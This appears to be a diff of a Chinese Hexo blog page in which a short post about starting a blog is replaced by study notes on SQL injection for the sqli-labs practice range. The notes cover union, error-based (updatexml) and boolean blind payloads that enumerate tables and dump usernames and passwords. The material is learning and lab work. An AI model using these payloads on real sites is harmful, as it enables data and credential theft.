@@ -16,21 +16,21 @@
   <meta name="author" content="bnles">
   <meta name="keywords" content="">
   
-    <meta name="description" content="创建博客的确是一个天才的想法，作为小白的我在这一过程中收获巨大，虽然期间确实困难重重，但是苦尽甘来，最终完成的那一刻，心情是难以表述的。">
+    <meta name="description" content="一、联合注入（页面有信息回显时） 首先判断注入类型（在id后加上 &#39;或 &quot; ），通过页面报错判断闭合  然后通过 ?id&#x3D;1&#39; order by 3--+ 猜测列数（如果“+”被过滤，可以使用“#，%23”代替“--+”）  接着通过 ?id&#x3D;-1&#39;union select 1,2,3 --+ 得到会回显信息的字段。（sqli-labs是2和3回显）  ?id&#x3D;-">
 <meta property="og:type" content="article">
-<meta property="og:title" content="学习笔记 一">
-<meta property="og:url" content="http://example.com/2022/09/20/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/index.html">
+<meta property="og:title" content="sql">
+<meta property="og:url" content="http://example.com/2022/11/22/sql%E9%9D%B6%E5%9C%BA%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9F%BA%E7%A1%80%E7%9A%84%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%EF%BC%89/index.html">
 <meta property="og:site_name" content="lay">
-<meta property="og:description" content="创建博客的确是一个天才的想法，作为小白的我在这一过程中收获巨大，虽然期间确实困难重重，但是苦尽甘来，最终完成的那一刻，心情是难以表述的。">
+<meta property="og:description" content="一、联合注入（页面有信息回显时） 首先判断注入类型（在id后加上 &#39;或 &quot; ），通过页面报错判断闭合  然后通过 ?id&#x3D;1&#39; order by 3--+ 猜测列数（如果“+”被过滤，可以使用“#，%23”代替“--+”）  接着通过 ?id&#x3D;-1&#39;union select 1,2,3 --+ 得到会回显信息的字段。（sqli-labs是2和3回显）  ?id&#x3D;-">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-09-20T07:05:02.000Z">
-<meta property="article:modified_time" content="2022-09-20T07:11:12.134Z">
+<meta property="article:published_time" content="2022-11-21T16:03:44.000Z">
+<meta property="article:modified_time" content="2023-04-08T12:57:00.653Z">
 <meta property="article:author" content="bnles">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>学习笔记 一 - lay</title>
+  <title>sql - lay</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -196,7 +196,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="学习笔记 一"></span>
+            <span id="subtitle" data-typed-text="sql"></span>
           
         </div>
 
@@ -207,8 +207,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-09-20 15:05" pubdate>
-          2022年9月20日 下午
+        <time datetime="2022-11-22 00:03" pubdate>
+          2022年11月22日 凌晨
         </time>
       </span>
     
@@ -219,7 +219,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          68 字
+          1.9k 字
         
       </span>
     
@@ -230,7 +230,7 @@
         
         
         
-          1 分钟
+          16 分钟
         
       </span>
     
@@ -268,12 +268,55 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">学习笔记 一</h1>
+            <h1 style="display: none">sql</h1>
             
             
               <div class="markdown-body">
                 
-                <p>创建博客的确是一个天才的想法，作为小白的我在这一过程中收获巨大，虽然期间确实困难重重，但是苦尽甘来，最终完成的那一刻，心情是难以表述的。</p>
+                <p>一、联合注入（页面有信息回显时）</p>
+<pre><code class="hljs">首先判断注入类型（在id后加上 &#39;或 &quot; ），通过页面报错判断闭合
+
+然后通过 ?id=1&#39; order by 3--+ 猜测列数（如果“+”被过滤，可以使用“#，%23”代替“--+”）
+
+接着通过 ?id=-1&#39;union select 1,2,3 --+ 得到会回显信息的字段。（sqli-labs是2和3回显）
+
+?id=-1&#39;union select 1,database(),3 --+ 得到当前数据库名
+
+?id=-1&#39;union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=&#39;数据库名&#39;--+（查询当前数据库中所有表的名字）
+
+?id=-1&#39;union select 1,database(),group_concat(column_name) from information_schema.columns where table_schema=&#39;数据库&#39; and table_name=&#39;表名&#39; --+
+
+?id=-1&#39;union select 1,group_concat(username),group_concat(password) from users --+(爆出字段信息)
+
+注：初学建议通过分析原码来学习理解注入语句（学习文章 https://blog.csdn.net/elephantxiang/article/details/120091507）
+</code></pre>
+<p>二、报错注入（）<br>    判断闭合后，直接通过 and updatexml(1,concat(0x7e,(select database()),0x7e),1) –+ 爆出数据库   </p>
+<pre><code class="hljs">  and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) --+(爆出表名)
+
+and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()),1,31),0x7e),1) --+（爆出字段名）
+
+and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#39;^&#39;,password)) from users),1,31),0x7e),1) --+（得到信息）
+
+注：应学习updatexml（）函数与extractvalue（）函数，截取函数substr（），substr最多能截取32位。
+</code></pre>
+<p>三、bool盲注</p>
+<pre><code class="hljs">先判断闭合，当页面不会显示信息，但对错页面回显不同时，可以使用bool盲注
+
+首先猜测数据库的长度 id=1’ and length(database())=8 --+
+
+ascii(substr(database(),1,1))=”ASCII“ --+（通过ASCII码值确定数据库名）
+
+and (select count(table_name) from information_schema.tables where table_schema=database())=1 --+（爆表的数量）
+
+and left((select table_name from information_schema.tables where table_schema=database() limit x,1),y)=&quot;&quot;--+（变换 x 和 y 的值我们可以得到所有的表名。）
+
+?id=1&#39; and left((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;表名&quot; limit x,1),y)=&quot;&quot;--+（爆字段名）
+
+?id=1&#39; and left((select ‘字段’ from ‘表名’ limit x,1),y)=&quot;&quot;--+（得到数据）
+
+注：通过python脚本可以辅助盲注
+</code></pre>
+<p>四、延时注入</p>
 
                 
               </div>
@@ -291,8 +334,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>学习笔记 一</div>
-      <div>http://example.com/2022/09/20/学习笔记-一/</div>
+      <div>sql</div>
+      <div>http://example.com/2022/11/22/sql靶场注入学习（基础的注入姿势）/</div>
     </div>
     <div class="license-meta">
       
@@ -304,7 +347,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年9月20日</div>
+          <div>2022年11月22日</div>
         </div>
       
       
@@ -336,9 +379,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/11/22/%E5%88%9D%E6%B6%89/" title="初涉2">
+                      <a href="/2022/12/25/ctf%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/" title="page">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">初涉2</span>
+                        <span class="hidden-mobile">page</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -346,8 +389,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/09/19/hello-world/" title="Hello World">
-                        <span class="hidden-mobile">Hello World</span>
+                      <a href="/2022/09/20/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89-%E4%B8%80/" title="学习笔记 一">
+                        <span class="hidden-mobile">学习笔记 一</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
